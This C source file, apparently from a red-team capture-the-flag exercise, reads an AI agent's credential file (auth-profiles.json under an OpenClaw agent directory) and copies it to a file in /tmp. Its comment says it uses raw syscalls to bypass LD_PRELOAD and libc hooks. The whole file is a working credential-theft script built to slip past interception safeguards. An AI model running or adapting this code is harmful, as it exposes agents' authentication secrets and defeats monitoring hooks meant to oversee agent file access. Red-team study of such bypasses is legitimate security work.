#include <sys/syscall.h>
#include <unistd.h>
#include <fcntl.h>

/* Read auth-profiles.json via raw syscalls — bypasses LD_PRELOAD and libc hooks */
int main(void) {
    char buf[8192];
    long fd, ofd, n;

    fd = syscall(SYS_openat, AT_FDCWD,
                 "/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json",
                 O_RDONLY);
    if (fd < 0) return 1;

    n = syscall(SYS_read, fd, buf, sizeof(buf));
    syscall(SYS_close, fd);
    if (n <= 0) return 2;

    ofd = syscall(SYS_openat, AT_FDCWD,
                  "/tmp/redlobster/flag18/rawread_out.txt",
                  O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (ofd < 0) return 3;

    syscall(SYS_write, ofd, buf, n);
    syscall(SYS_close, ofd);
    return 0;
}
